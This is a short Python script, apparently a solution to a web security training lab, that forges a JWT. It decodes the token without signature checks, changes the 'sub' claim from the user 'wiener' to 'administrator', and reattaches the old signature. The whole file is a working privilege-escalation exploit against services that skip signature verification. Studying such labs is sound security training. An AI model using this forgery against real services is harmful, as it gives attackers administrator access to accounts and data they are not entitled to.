import jwt
import base64

# user jwt token

token = input("Enter the JWT token: ")
# decode the token
payload = jwt.decode(token, options={"verify_signature":False})
print(f"Decoded payload:{payload}")

# change the sub claim to admin
header, payload, signature = token.split('.')
decode_payload = base64.urlsafe_b64decode(payload+ "=" * (-len(payload) % 4))
modified_payload = decode_payload.replace(b'"sub":"wiener"', b'"sub":"administrator"')
print(f"Modified payload:{modified_payload.decode()}\n")

# genarate the new token
modified_payload_base64 = base64.urlsafe_b64encode(modified_payload).decode().rstrip('=')
new_token = f"{header}.{modified_payload_base64}.{signature}"
print(f"New token:{new_token}")